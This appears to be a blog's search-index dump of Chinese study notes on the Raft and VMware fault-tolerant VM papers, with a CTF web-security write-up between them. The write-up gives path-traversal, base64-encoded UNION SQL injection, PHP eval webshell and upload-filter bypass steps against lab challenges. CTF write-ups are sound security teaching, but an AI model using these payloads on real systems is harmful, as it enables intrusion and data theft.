RPC（包括heartbeat消息）中以便其他的服务器最终能够发现此下标。一旦follower知道某个日志条目已经被提交，则按照日志中的顺序依次将日志条目应用到自己的状态机（即按照顺序执行日志中的指令）。作者设计了Raft日志机制在高层次维护不同服务器上的日志的一致性。不仅简化了系统的行为并且使系统的行为是可预测的，并且是确保安全性的重要组件。Raft具有下列属性，一起构成了Fig 3中的Log Matching Property： 如果不同日志中的两个条目具有相同的下标和任期，那么二者一定保存了相同的命令。 如果不同日志中的两个条目具有相同的下标和任期，那么这两个日志中在这个条目之前的记录都是相同的。第一个性质遵循这一事实：leader至多在给定的任期和日志下标所标识的位置创建一个日志条目，并且日志条目绝不会修改自己的位置。第二个性质通过AppendEntries执行的简单一致性检查保证。在发送一个AppendEntries RPC时，leader在其中包含新的条目之前的条目的下标和任期。如果follower没有在日志中找到具有相同下标和任期的条目，则拒绝这一新的条目。一致性检查作为一个归纳步骤：日志初始的空状态满足Log Matching Property，并且一致性检查在新的日志加入时保证Log Matching属性。结果就是，当AppendEntries成功返回时，leader知道follower的日志与自己的日志完全一致。在正常运行时，leader的日志和follower的日志保持一致，因此AppendEntries的一致性检查从不失败。但是leader宕机会造成日志不一致（旧的leader可能没有完全复制日志中的所有条目）。这种不一致会在一系列的leader和follower宕机中变得更加严重。Fig 7表示了follower的日志可能与新的leader不一致的方式。follower可能有leader中没有的条目，也可能缺少leader中的条目。日志中缺少和额外的条目可能会跨越多个任期。raft中，leader通过强迫follower中的日志复制自己的日志来处理一致性，这意味着follower日志中与leader冲突的部分将会被覆盖。后面将会证明这一机制在加上几个限制之后是安全的。为了让follower的日志与自己的日志一致，leader必须找到两个日志一致的最新的日志条目，并清空follower日志在这个条目之后的所有内容，并且向follower发送leader日志中这个日志条目之后的所有条目。所有的这些动作都是对AppendEntries RPC检查的响应。leader为每个follower维护nextIndex，nextIndex是leader将要发送给这一follower的下一个日志条目的下标。当leader刚刚赢得选举时，将所有的nextIndex初始化为自己日志中最后一个下标的后一个值（如果leader日志中最后一个下标为3，就将所有的follower的nextIndex初始化为4）。如果follower的日志与leader的日志不一致，AppendEntries的一致性检查将会在下一次AppendEntries RPC中失败。在遇到失败后，leader使nextIndex-1并重试。最终nextIndex将会达到leader和follower一致的状态。成功后，移除follower在nextIndex之后的日志条目，并将leader之后的条目复制到follower。一旦AppendEntries成功，follower的日志将会与leader保持一致，并且在后续的任期中保持。如果需要，可以优化协议来减少失败的次数。例如，当拒绝AppendEntries请求时，follower可以包括矛盾的条目的任期和这个任期中保存的第一个下标。leader可以利用这一信息减少nextIndex以绕过所有的这个任期中矛盾的条目。每个有冲突的任期将会需要一个AppendEntries RPC而不是每个条目都需要一个AppendEntries RPC。在实践中，这一优化可能不是必要的，因为服务器错误可能经常发生，因此不会有太多冲突的条目。通过上述机制 leader将不会需要任何额外的操作来恢复日志一致性，leader只需要开始正常运行，然后日志将会自动收敛到一致状态。leader永远不会覆盖或者删除自己日志中的日志条目，这就是Fig 3中的Leader Append-Only Property。只要大部分服务器在线，raft就能够接收、复制和执行新的日志条目。在正常情况下新的日志条目将会通过一轮RPC调用复制到集群中的大部分服务器中，并且运行缓慢的follower不会影响整个系统的效率。Safety上面所述的机制不能够保证每台机器以相同的顺序完成相同的操作。例如，follower可能在leader提交几个日志条目时离线，然后可能被选举为leader并且使用新的条目覆盖这些条目，结果是不同的状态机可能以不同的顺序执行指令。通过限制哪个服务器可以被选举为leader确保leader在任何给定的任期都包含了在先前任期中已经提交的日志条目，即Fig 3中的Leader Completeness Property。Election restrictionRaft保证从选举开始，每个新的leader的日志中都存在之前的任期中已提交的条目，而不需要将这些条目转移给leader。这意味着日志条目只会单向流动，并且leader永远不会覆盖自己的已经存在的日志条目。(Append Only)除非candidate的日志中包含了所有的已提交的日志条目，否则Raft将在投票过程来阻止candidate赢得选举，candidate在被选举前必须与集群中的大部分服务器通信，意味着每个已提交的条目必定在这些服务器其中之一的日志中。如果candidate的日志至少与这些服务器中的任何其他日志一样是最新（up-to-date）的，那么candidate中就具有所有已提交的条目。RequestVote RPC实现了这一限制：RPC包括了candidate的日志信息，并且如果投票者自己的日志比cadidate的日志更新，那么将会拒绝此次投票。Raft通过比较日志中最后一个条目的下标和任期来比较哪两个日志更新。如果日志中含有有不同任期的条目，那么认为具有更大的任期的日志更新。如果日志以相同的任期结尾，则更长的日志就是更新的。Committing entries from previous terms一旦条目被保存在大多数服务器上，leader就会知道当前实际胺片的条目已经被提交。如果在提交某个日志条目之前leader宕机，未来的leader将会尝试复制这给条目。leader不能立即断定上一个任期的条目一旦保存在大多数服务器上就已提交。Fig 8表示当旧的日志条目保存在大多数服务器上时，依然可能被未来的leader覆盖。为了消除Fig 8中出现的问题，Raft从来不通过计数副本提交来自先前任期的日志条目。只有来自leader当前任期的日志条目才会通过计数副本的数量来提交，一旦一个条目以这种方式被提交，那么根据Log Matching Property，所有之前的条目将会被间接提交。在某些情况下，leader可以安全地断定先前的日志条目已经被提交（例如，如果某个日志条目被保存在每个服务器上），但是为了简便起见，Raft使用了保守的方式。Raft在提交规则中引入了额外的复杂度，因为当leader从先前的任期复制日志时，其中保存了先前的任期。在其他的共识算法中，如果新的leader从先前的任期复制日志，那么需要使用新的任期数来复制。Raft的方式使解释日志条目更加容易，因为在不同的日志中维护了相同的任期数。另外Raft中新的leader发送更少的来自先前任期的日志条目，而其他的共识算法需要发送重复的日志条目来重新编号。Follower and candidate crashes如果follower和candidate宕机，那么发送给该服务器的RequestVote和AppendEntries RPC将会失败。Raft通过无限重复此过程来处理，如果宕机的服务器重启，那么RPC将会成功完成。（如果leader向follower 发送AppendEntries RPC，返回错误，那么leader不会立刻重发，而是等到heartbeat任期超时后再次发送，这样新加入的和恢复的服务器可以合并处理，从而简化系统的复杂度）。Raft RPC是幂等的，因此这一机制不会带来任何问题。（我对幂等的理解是，第一次发送给服务器的RPC如果没有收到，第二次收到了，那么对于整个系统产生的效果是一致的，而不会因为第一次没收到造成系统错误）。例如，如果follower收到了AppendEntries请求，该请求中包括自己日志中已经包含的日志条目，则follower将会忽略请求中的日志条目。Timing and availabilityRaft的安全性不能依赖于定时器:系统不能产生不正确的结果，而某些事件可能比预想的发生的更早或更晚。但是系统的可用性必须依赖于定时器（可用性指的是系统在指定时间内向客户端响应的能力）。例如，如果消息交换比服务器宕机的时间要长，那么candidate将不会保持足够长的时间以赢得选举，而没有稳定的leader，Raft将不会向前推进。Leader选举是Raft的一个方面，而定时器是其中的关键部分。只要系统满足以下时间要求，Raft就能够选举并维护一个稳定的leader：broadcastTime&lt;&lt;electionTimeout&lt;&lt;MTBF。其中broadcastTime是服务器向集群中每个服务器发送RPC所需的平均时间，electionTimeout是选举超时时间，MTBF是单台服务器宕机的时间。broadcastTime应该远小于electionTimout，这样leader能够发送heartbeat来阻止follower启动新一轮选举，同时由于选举超时使用随机数，这一不等式也使系统不会出现分离选票的情况。electionTimeout必须远远MTBF，所以系统能够平稳运行。当leader宕机时，系统将会在选举超时时间内变得不可用，我们希望在整个系统的运行时间中，这一不可用的时间段仅占一小部分。broadcastTime和MTBF是底层系统的属性，而electionTimeout是我们需要选择的。Raft的RPC通常需要接受方将信息保存在存储器中，因此broadcastTime通常在0.5ms到20ms的范围内，具体取决于存储即使。结果就是选举超时时间应该在10ms~500ms范围内。而MTBF通常是几个月或更多，因此时间要求很容易满足。7 Log compactionRaft的日志随着包含更多的日志请求而增长，但是在实际的系统中，随着日志的增长会占用更多地内存空间以及需要更多的时间来重放。因此需要某些机制来去除系统中的冗余信息。snapshot是最简单的压缩方式。在snapshot中，当前完整的系统状态作为快照写入到存储中，然后快照之前的所有的日志都被删除。增量压缩方法例如log cleaning和log-structured merge trees也是可行的。这些方法一次处理部分数据，所以能够将压缩的负载在时间上均匀分布。首先选择包含了许多已经被删除或覆盖的对象的数据域，然后重写仍然保持活跃的对象并释放多余的空间。这种方式相比快照需要额外的机制和复杂度，因为快照不需要在完整的数据集上进行操作。log cleaning需要修改以适应Raft，而状态机可以使用与snapshot相同的接口实现LSM树。Figure 12说明了Raft的snapshot的基本思路。每个服务器独立地执行快照，仅仅包含自己日志中已经提交的日志条目。大部分工作是状态机将自己的当前状态写入到快照中。raft在快照中包括少量元数据：last included index是日志中最后一个记录的下标（也就是状态机最后一个执行的操作），last included term是对应的任期号。保留这些元数据以支持AppendEntries中为快照后的第一个日志记录执行一致性检查，因为需要前一个日志记录的下标和任期号。当服务器完成了一次快照后，可能删除直到最后一个下标的所有的日志记录。尽管服务器通常独立地记录快照，但是当leader已经丢弃了要发送给follower的下一个日志时，必须将快照发送到落后的follower。但是这种情况并不常发生：与leader保持一致的follower已经有了这一日志（由于commit需要保证大多数follower已经将对应command应用到自己的状态机上，并且压缩的日志是已经commit的日志，因此决定了某些状态远远落后于leader的follower是少数）。但是当出现某个远远落后于leadaer或是集群中新加入某个服务器时，需要leader向其发送快照来使follower保持与系统同步。leader使用新的RPC InstallSnapshot来向远远落后于follower发送快照。当follower接收到快照时，必须决定如何处理当前的日志。如果快照中包含了接收方不含有的日志，follower丢弃自己的全部日志，使用快照来代替，并且follower可能含有未提交的与快照相矛盾的日志。如果follower接收到的快照与当前日志的前缀相同，即在之前接收到快照之后又接收到了新的日志，说明leader发生了重传，则删除掉被快照覆盖的日志，保留快照之后的日志，因为这些日志依然是有效的。快照是与Raft的强leader规则相违背的，因为follower可以不通过leader独立计算快照。但是因为当follower计算快照时，整个系统已经达成了共识，因此并不会出现冲突。数据仍然只从leader流向follower，只要follower可以重新组织自己的数据。考虑另外一种基于leader的，只有leader能够创建快照，然后leader从自身向follower发送快照的方式。这种方式存在两个缺点：1. 从leader向follower发送快照将会浪费网络带宽，并且拖慢快照的过程。每个follower已经有了产生快照所需的所有信息，并且自己产生快照比从leader接收的开销更小。2. leader的实现将会更加复杂，例如leader可能想要并行发送快照和新的日志，以免阻塞新的客户端请求。提高快照性能的方法：1. 服务器必须决定何时创建快照，如果创建快照过于频繁，则会浪费磁盘带宽和能量。如果创建时间过于不频繁，那么将会有耗尽磁盘容量的风险，并且在重启时重放日志所需的时间更长。一个简单的策略是在日志到达一个固定的长度时创建快照，如果这一长度比快照占用的空间大很多，那么快照引起的磁盘带宽将会很小。2. 创建快照需要一定时间，并且不希望延迟正常的操作。因此采用写时复制技术，新的更新不会影响正在创建的快照。例如作者采用Linux的写时复制技术来创建整个状态机的内存快照。8 Client interactionRaft的客户端发送所有的请求到leader。当client第一次启动时，随机选择一个服务器进行连接，如果该服务器不是leader，则会拒绝client的连接，并且告诉客户端自己知道的leader。如果leader宕机，客户端的请求将会超时，然后再随机选择一个客户端来重复上述过程。（但是我有一个问题：会不会选择的这个服务器自己认为自己是leader，而实际上并不是leader，这种情况如何区分？首先如果leader已经不再是leader时，说明已经与大部分服务器失去联系，从而无法达成共识，也就无法提交新的日志，而执行请求中的操作是在日志提交后开始的，因此对于需要写日志的操作，这一问题是不存在的。而对于不需要写入日志的只读请求，在下面采用了两种额外的机制来预防。）Raft的目标是实现一个可线性化的语义，即每个操作看起来像是在调用和响应之间的某一个点瞬间完成。然而，Raft可以多次执行一个操作，例如如果leader在提交日志之后，响应client之前宕机，client将会向新的leader重发请求，造成leader再次执行此操作。解决方式是client为每个操作赋一个唯一的序列号。然后状态机跟踪每个client的最新的序列号和相关的响应。如果接收到了一个已经被执行过的序列号，则立即响应而不需要再次执行。只读的操作不需要向日志中写入内容，但是可能会向client返回过时的数据，因为响应client的leader可能已经被一个新的leader取代（例如leader与其他服务器断开连接）。可线性化的读操作不能返回过时的数据并且Raft需要两个额外的预防操作来防止读到过时的数据。首先leader必须具有哪个日志记录已经被提交的最新信息。Leader Completeness Property保证leader维护了所有已经提交的日志记录，但是在任期开始时，可能不知道哪些已经被提交。为了知道提交的日志是哪一部分，需要从任期内提交一些日志记录。Raft通过让每个leader在任期开始时提交一个空白的no-op日志来解决此问题。第二，leader必须在处理只读请求之间检查自己是否已经被废止。Raft要求leader在响应一个只读请求前首先向集群中的大部分服务器发送heartbeat。" }, { "title": "Web安全原理 CTF Writeup", "url": "/_posts/ctf-writeup/", "categories": "CTF", "tags": "CTF, Web", "date": "2022-10-26 00:00:00 +0000", "snippet": " Web安全原理期末CTFWhat’s your want?查看题目源代码，没有发现提示。向输入框中输入flag，得到如下结果猜测左上角字符串为base64编码，解码得到flag{WelC0me_to_ctf2}php is the best查看index page源代码，得到提示：查看another page源代码，得到提示：可以看到flag在index和another的上级目录，并且后...", "content": " Web安全原理期末CTFWhat’s your want?查看题目源代码，没有发现提示。向输入框中输入flag，得到如下结果猜测左上角字符串为base64编码，解码得到flag{WelC0me_to_ctf2}php is the best查看index page源代码，得到提示：查看another page源代码，得到提示：可以看到flag在index和another的上级目录，并且后端对输入路径进行了过滤，不能以.开头，也不能出现两个以上的..，因此尝试使用环境变量来获取flag，构建get参数为?file=pwd/../../flag, 得到flag为flag{Bypass_File_Path_Check}ID SystemURL中有id=MQo=，猜测是base64编码，解码后得到id=1。首先判断数据库中共有多少列，对1 order by 3编码，作为id，请求得到no result。对1 order by 2编码，作为id，得到两个字段，分别为S_ID和1-S_Name，说明flag应该不在这个表中。尝试获取当前表所在的数据库，使用1 union select 1, database();来对数据库进行联合查询，编码为MSB1bmlvbiBzZWxlY3QgMSwgZGF0YWJhc2UoKTs=，得到说明当前数据库为websec。尝试获取数据库中存在的所有表，使用1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=’websec’;编码得到MSB1bmlvbiBzZWxlY3QgMSwgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J3dlYnNlYyc7，作为id输入，得到可以看到其中存在名为flag的表，使用同样方式获取flag中有哪些字段，使用1 union select 1, group_concat(column_name) from information_schema.columns where table_name=’flag’;，编码后作为id，得到看到flag中只有一个value字段，使用1 union select 1, value from flag;编码输入得到为什么联合查询需要select 1, group_concat()？因为联合查询要求两部分查找产生的表列数相同，而前面根据order by推断出web_security这个表的有两列，而group_concat和flag都只有一列，因此需要通过select 1, value/group_concat再添加一列。Upload首先创建webshell文件，写入&lt;?php @evalOST[‘pass’]);?&gt;，命名为shell.php.查看页面源代码，发现只允许上传jpg和png类型的文件，因此将文件重命名为shell.jpg以绕过前端检查，并使用burpsuite来拦截请求，将文件名重新改为php。页面报错error file head，说明后端对文件头做了校验，在文件头部添加FFD8FFE0，上传成功。访问shell.php文件，发现File not found。尝试获取swp文件，在url中输入.index .php.swp，可以获取，通过vi -r打开，可以看到其中有如下几行代码：用户上传文件的文件名被重命名为md5加密后的密码.php。对shell.php计算md5，得到25a452927110e39a345a2511c57647f2，访问25a452927110e39a345a2511c57647f2.php文件，得到flag:REFERENCEhttps://blog.csdn.net/qq_35056292/article/details/102896557" }, { "title": "The Design of a Practical System for Fault-Tolerant Virtual Machines", "url": "/_posts/vm-ft/", "categories": "论文阅读, Distributed Systems", "tags": "Distributed Systems, 论文阅读", "date": "2022-10-21 00:00:00 +0000", "snippet": "Introduction实现容错服务器的通常方法是primary/backup机制，当primary server出错时，backup server可以作为primary server推动系统继续向前运行。backup server的状态必须在任何时候都与primary server保持一致，因此在primary出错时backup可以立即接替，并且这种机制将错误对外部的客户端隐藏，并且不会出...", "content": "Introduction实现容错服务器的通常方法是primary/backup机制，当primary server出错时，backup server可以作为primary server推动系统继续向前运行。backup server的状态必须在任何时候都与primary server保持一致，因此在primary出错时backup可以立即接替，并且这种机制将错误对外部的客户端隐藏，并且不会出现数据丢失。一种在backup上复制primary的状态的方式是不断将primary所有的状态变化都发送到backup，包括CPU，内存，I/O设备。但是这一方式受到带宽的限制。状态机方法可以使用更少的带宽来复制服务器状态。将服务器抽象成确定性状态机，使不同的服务器从相同的初始状态启动，并且确保按照相同的顺序收到相同的输入请求。因为大部分服务器或服务具有某些非确定性的状态，因此需要额外的协调操作来保证primary和backup同步。但是保持primary和backup同步所需的额外信息的数量远小于primary中正在改变的状态（主要是内存更新）的数量。在hypervisor上运行的VM是非常适合用于实现状态机方法。VM可以被看作定义好的状态机，其操作是被定义的虚拟机的操作。与物理机相同，VM同样有某些非确定性的操作，例如读取时间时钟或传递中断，因此额外的信息必须发送到backUp以保持primary和backup之间的同步。因为hypervisor具有对于VM的执行具有完全的控制权，包括传递输入，因此hypervisor能够获取primary VM的非确定性操作的所有必要的信息，因此能够在backup VM上正确地重放这些操作。因此能够在商用硬件上为VM实现状态机方法，而不需要额外的硬件修改，因此能够为最新地微处理器实现容错。另外，状态机方法所需的低带宽也为primary和backup在物理上分离提供了可能。作者在VMware vSphere 4.0平台上使用primary/backup approach实现了fault-tolerant VMs，其中以高性能方式运行了完全虚拟化的x86虚拟机。由于VMware vSphere实现了完全的x86虚拟机，因此能够为任何x86操作系统和应用程序提供容错机制。VMware vSphere Fault Tolerance基于确定性重放，并添加了必要的额外协议和功能来构建完整的容错系统。除了提供硬件容错之外，还通过在出现服务器错误后在本地集群中的任何空闲的服务器中启动新的backup虚拟机来恢复冗余。作者构建的容错系统用于处理fail-stop错误，这种服务器错误能够在出错的服务器造成不正确的额外操作前被检测出。BASIC FT DESIGNFigure 1展示了系统基本设置。对于一台给定的希望提供容错的服务器（这台服务器作为primary），在不同的物理服务器上运行backup VM，使backup与primary始终同步并且与primary执行相同的操作，二者之间仅有微小的时间延迟。我们称这两台VM是virtual lock-step的。VM的虚拟磁盘在共享存储器上，因此可以访问primary和backup的输入和输出。只有primary VM在网络中宣告其自身存在时，所有的网络输入才能够到达primary VM。类似地，所有地输入都会输入到primary VM中。primary VM接收到的所有的输入通过称为logging channel网络连接发送到backup VM。对于服务器负载，决定性的输入流量是网络和磁盘。在必要时传输额外信息以保证backup VM与primary VM执行相同的非确定性操作，结果是backup VM总是与primary VM的执行保持一致。不同的是backup的输出被hypervisor丢弃，因此只有primary产生的真实输出会被返回给客户端。primary和backup会遵守特定的协议，其中包括来自backup VM的显式确认，以保证在primary出错时不会出现数据丢失。系统通过在相邻的服务器之间发送heartbeat和监视logging channel上的流量来检测是否存在primary或backup VM出错。此外，即使出现primary和backup之间丢失通信（称为splitbrain），也必须确保只有一个primary或backup VM接替primary执行。Deterministic Replay Implementation复制服务器或VM的执行可以被抽象为确定性状态机的复制。如果两个确定性状态机在同样的初始状态执行，并且按照相同的顺序读取输入 ，那么将会具有相同的状态迁移序列并产生完全一致的输出。虚拟机具有多种不同的输入，包括输入的网络分组，硬盘读，键盘和鼠标操作。非确定性的事件（例如虚拟中断）和非确定性的操作（例如读处理器的时钟周期计数器）同样会影响VM的状态。因此对于复制在任何操作系统上运行的任何VM的执行和工作负载提出了三个挑战：（1）必须正确地捕获必要的所有的输入和非确定性事件来确保backup VM的确定性执行。（2）正确地将输入和非确定性事件应用到backup VM中。（3）在不影响性能的情况下完成上述要求。此外，x86位处理器中的许多复杂操作是未定义的并且具有非确定性的副作用。捕获这些副作用并且重放来产生相同的状态提出了另一项挑战。VMware确定性的重放为VMware vSphere平台上的x86虚拟机提供了此种功能。确定性的重放将VM的输入以及所有与VM的执行相关的可能的不确定性事件记录在日志记录流中，并将其写入到日志文件中。通过从日志文件中读取日志记录来重放VM执行过程。对于非确定性的操作，记录足够的信息来使VM重放相同的状态改变和输出。对于非确定性的事件，例如定时器或IO完成中断，事件发生时执行的指令也同样被记录。在重放时，the event is delivered at the same point inthe instruction stream（我的理解是事件按照primary中发生的顺序进行重放，例如在primary中，首先执行指令A，然后触发事件B，然后执行指令C，在重放时也要按照相同的顺序依次执行ABC），VMware确定性重放实现了一个高效的事件记录和事件传递机制，每个中断在发生时被记录，并在重放过程中在合适的指令处被传递给VM。FT Protocol作者使用确定性的重放来产生必要的日志记录以记录primary VM的执行过程，但是并不需要将记录写在磁盘上，而是通过logging channel将日志发送给backup VM.backup VM实时重放记录，因此执行过程与primary完全一致。但是为了实现这一目的，必须在严格的FT protocol上按照递增序在logging channel上发送日志。基本的输出要求(Output Requirement)是：如果backup VM在primary出错后接管了primary，backup VM必须继续执行，并且与primary VM已经发送到外部客户端的输出完全一致（我的理解是要求backup VM和primary VM过去的执行和输出完全一致，并在primary出错时接续执行，而不会出现服务中断或不一致的现象，从而对客户端隐藏）。在failover发生后，backup VM开始执行的方式可能与primary VM继续执行的方式完全不同，因为在执行期间可能会产生许多非确定性的事件。但是只要backup VM满足上面说的输出要求，在failover期间没有外部的可见状态和数据丢失，客户端就不会注意到服务中的中断或不一致现象出现。可以通过推迟外部输出（尤其是网络包）直到backup VM收到了能够使其重放这一输出操作的所有必要信息时来保证输出要求。一个必要条件是backup VM必须接收到所有输出操作之前的的日志记录。这些日志记录将会使backup能够执行到上一个日志记录点。但是如果primary执行完输出操作之后立即出错，backup VM将会知道自己必须重放primary的输出操作没并且只能go live（停止重放并且接替primary VM的工作），如果backup在执行完输出操作前的最后一条日志后接替primary，某些非确定性的事件可能在新的primary执行输出操作前改变其执行路径。解决上述问题的最简单的方式是在每个输出操作处创建一个特殊的日志记录，于是有了能够强制保证输出要求(Output Requirement)的输出规则：primary VM可能不会向外部世界发送输出，直到backup已经接收并确认与产生输出相关的操作的日志记录。如果backup VM收到了包括产生输出在内的所有的日志记录，backup VM将会能够重新产生primary VM在输出时的状态，因此当primary出错时，backup将会到达与输出一致的状态。反过来讲，如果backup VM没有收到所有必要的日志记录，并且接替了primary VM，那么其状态可能很快与primary出现不一致，因此也就会产生与primary不一致的输出。输出规则并没有说需要停止primary VM执行。只需要推迟向客户端发送输出，而VM自身是可以继续往下推进的。因为操作系统使用异步中断来通知非阻塞的网络和磁盘输出完成，因此VM可以继续执行而不会被输出延迟影响。Figure 2中展示了primary和backup VM上事件发生的时间线。primary指向backUp的箭头代表从primary向backup转发日志记录，而backup从primary的箭头代表了backup对日志的确认。异步事件、输入和输出操作的信息必须作为日志被发送到backup并确认。对外部世界的输出必须被推迟到收到来自backup的对于输出操作的日志的确认后。只要输出规则得到满足，backup VM将能够以与primary的上一个输出相一致的状态接管primary.无法保证failover中所有的输出都被执行一次。primary发送输出时，如果不采用两阶段提交的事务，backup无法确认primary是在发送最后一个输出之前还是之后崩溃。但是由于网络协议如TCP存在处理丢包和重复的机制，因此重复的响应将会被忽略。并且如果在切换时出现丢包，客户端超时没有收到来自服务端的响应，也将会重发，因此丢包也可以被网络协议自身解决。Detecting and Responding to Failure如果另一个VM出错，primary和backup VM必须能够快速响应。如果backup出错，primary将会go live，即离开记录模式，并且停止在logging channel上发送日志记录，开始正常执行。如果primary VM出错，backup将会go live。由于backup在时间上相对于primary的执行略有延迟，backup VM可能有一些日志记录已经收到但是由于自身还没有执行到对应的状态，因此尚未执行。backup VM将会持续重放日志中记录的执行过程，直到没有收到新的日志。此时，backup VM将会停止重放模式，并且开始作为一个正常的VM执行。也就是说，backupVM被提升为primary VM，并且没有backup VM存在。由于此时不再存在backup VM，因此当客户端执行输出操作时，新的primary VM将会直接输出到外部。在转换到正常模式的过程中，可能需要某些设备相关的操作来使输出正常完成。VMware FT自动在网络中广播新的primary VM的MAC地址，因此物理网络交换机将会知道新的primary VM在哪台服务器上。另外新的primary VM可能需要重新执行某些磁盘I/O检测primary和backup VM错误的方法：VMware FT使用服务器间的UDP heartbeat来检测服务器的状态。VMware FT监视器检测从primary发送到backup的日志流量以及从backup发送给primary的响应流量。由于定期的时间中断，日志流量也应该是定期的，并且一个正在工作的guest OS日志流量从不中断。因此，日志流或确认流的中断标志着VM出错。如果heartbeat或日志流量停止的事件超出指定的timeout事件，就可以认为VM出错。上述错误检测方法存在的缺陷：无法解决split-brain问题。如果backup服务器停止接收来自primary的heartbeat，可能说明1.primary服务器出错。2.两台服务器仍然在工作，但是二者之间的网络连接丢失。如果primary VM仍然在运行时，backup提升为primary，那么正在与服务器通信的客户端可能会出现数据污染的问题。因此必须确保当检测到错误时只有一台服务器在运行。利用保存VM的虚拟磁盘的共享存储来避免split-brain问题。当primary或backup想要go live时，首先在贡献存储上执行一个test-and-set操作。如果操作成功，则说明此时只有一台服务器在运行，可以go live。如果使用原子操作时无法访问共享存储，那么将会等待直到可以访问为止。如果共享存储是因为本身的故障导致无法访问，那么VM将会无法正常工作，因为VM的虚拟磁盘也保存在共享存储中。因此使用共享存储来解决split-brain不会影响可用性。当错误发生并且VM go live后，VMware FT将会自动在另一台host上启动新的backup VM来恢复冗余。PRACTICAL IMPLEMENTION OF FTStarting and Restarting FT VMs作者采用了VMware vSphere的VMotion机制来实现保持backup与primary相同的状态，以及在backup出错时重启一台新的backup，并且不会影响primary的执行。VMware VMotion允许以最小的代价将正在运行的VM从一台服务器迁移到另一台服务器，VM暂停的时间通常小于1秒。作者创建了修改版的VMotion，从远程服务器上创建了一个正在运行的VM的副本，但是并没有销毁本地服务器上的VM。也就是说，修改过的FT VMotion在远程服务器上克隆了VM而没有迁移。FT VMotion同样创建了一个logging channel，并且使源VM作为VM进入了logging模式，目标VM作为新的primary进入了重放模式。与VMware VMotion相同，FT VMotion使VM被打断的时间小于1秒。启动一个backup VM的另一个问题是选择一台合适的可以用于运行VM的服务器。Fault-tolerant VM在拥有共享内存的服务器集群中运行，因此所有的VM通常可以运行在集群中的任何一台服务器上。因此VMware vSphere能够在一台或多台服务器出错时恢复冗余性。VMware vSphere实现了一个集群服务来维护管理和资源信息。当错误发生并且primary VM需要新的backup VM来重建冗余时，primary VM通知集群服务需要新的backup。集群服务根据资源使用和其他的限制条件来选择最合适的服务器运行backup VM，然后调用FT VMotion来创建新的backup。通过这一机制可以在出错后的几分钟内完成重建，并且对fault-tolerant VM的执行不会产生太大的影响。Managing the Logging Channel实现中hypervisor维护一个buffer用于primary和backupVM的日志记录。当primary VM执行时，primary将日志写入buffer，backup VM从buffer中读出。primary的日志缓冲尽可能快的刷新到logging channel，并且一旦日志被写入到channel中，backup就从中读取日志到自己的缓冲区。backup每次从网络中读入一批日志到自己的日志缓冲区后向primary发送响应，响应使VMware FT决定根据Output Rule被推迟的输出何时被发送给backup。如图3所示。如果backup VM在读取时发现日志缓冲区是空的，则将被阻塞直到新的日志到来。因为backup VM不与外部通信，因此将不会影响VM的客户端。类似地，如果primary VM发现日志缓冲区满了，则会停止执行直到缓冲区被刷新。primary的停止是一个天然的流控制机制，使primary在产生日志过快时暂停执行。但是primary的暂停会影响外部的客户端，因为primary VM将会完全停止执行并直到可以向缓冲区写入日志记录和继续执行时才能响应客户端。因此需要尽可能降低将缓冲区填满的可能性。缓冲区可能填满的一个原因是backup执行过慢因此读取日志的速度太慢。通常backup必须能够以与primary大概相同的速度重放primary的执行过程。但是如果backup所在的服务器负载过多，则backup可能被不会得到足够的CPU和内存资源来快速执行。除了避免缓冲区被填满造成primary阻塞之外，另一个不能让backup和primary之间差距太大的原因是，当primary出错时，backup VM必须在go live并与外部通信之前通过重放所有已经确认的日志记录来使自己达到primary出错时的状态。重放日志记录所需的时间至少是backup落后于primary的时间，因此backup go live所需的时间通常等于检测时间+重放时间。因此，如果backup落后于primary的时间过长，那么对应的failover时间也会延长。Operations on FT VMs另一个问题是如何处理可能应用在primary VM上的各种控制操作。例如，如果primary显式的断电，backup VM也会停止，而不会尝试go live。同理，任何primary上的管理操作例如提高CPU共享也同样应该应用到backup上。通常，VM上的大部分操作仅应该在priamry VM上使用，随后VMware FT将所有必要的控制记录发送给backup以在backup上执行对应的操作。唯一的能够在primary和backup上独立执行的是VMotion。也就是说，primary和backup VM可以被独立地VMotioned到其他的主机上（前面提到了， VMotion的作用是将一台主机以最小的代价迁移到另一台主机，作者修改的FT VMotion是克隆到另一台主机）。VMware FT确保没有VM会被迁移到存在VM的服务器上，因为这种情况下服务器宕机会导致两台VM同时出错，从而不再具有容错能力。因为backup VM必须从源primary断连，并且在合适的时候重新连接到目标primary，因此primary的VMotion在正常的VMotion上添加了一些额外的复杂度。对于正常的VMotion，需要所有未完成的磁盘IO在VMotion最终切换执行时完成。对于primary VM，可以通过使primary等待直到物理IO完成并将完成发送到VM来实现。对于backup，没办法在需要时让所有的IO完成，因为backup VM必须重放primary VM的执行并在相同的执行点处完成IO。primary VM可能一直在执行磁盘IO，而backup VM又必须与primary保持一致，所以backup也就无法使IO在给定的某一点处完成。VMware FT提供了一个解决方案：当backup VM在VMotion的最终执行点处时，通过logging channel来使primary暂停所有的IO，backup VM因此能够在重放primary VM执行暂停操作时自然结束所有的IO。（简单来讲，因为primary能够随时停止IO而backup依赖于primary的执行，并且backup与primary存在通信机制，因此backup通过logging channel通知primary先暂停一下，因为backup重放primary的执行过程，因此自然也就会重放primary的暂停，从而使backup的IO全部结束）Implementation Issues for Disk IOs磁盘IO存在一些问题需要解决。首先，假设磁盘操作是非阻塞的，因而也就可以并行执行，那么同时访问同一磁盘位置的操作将会导致非确定性。同时，磁盘IO的实现使用DMA来直接与虚拟内存通信，因此同时访问同一内存页的操作也会导致不确定性。作者的解决方式是检测这种IO竞争，并且强迫这些竞争性的磁盘IO在backup和primary上以相同的顺序串行。第二，磁盘操作可能与VM中的应用或OS的内存访问相冲突，因为磁盘操作通过DMA来直接访问VM的内存。例如，如果VM中的应用或OS正在读某个内存块，同时这个块正在发生磁盘读，则会产生不确定性结果。一种解决方式是对磁盘操作的目标内存页启用页保护，当VM正好需要访问的页是磁盘操作的目标页时，页保护将会产生trap，使VM等待直到磁盘操作完成。由于修改页的MMU保护的开销很大，因此使用bounce buffer来实现保护。bounce buffer是一个临时的buffer，与正在被磁盘操作访问的内存块大小相同，磁盘读操作被修改为将数据读取到bounce buffer，并在IO结束后将数据拷贝到guest的内存。类似地，对于磁盘写操作，数据首先被拷贝到bounce buffer，然后磁盘写被修改为写来自bounce buffer的数据。对bounce 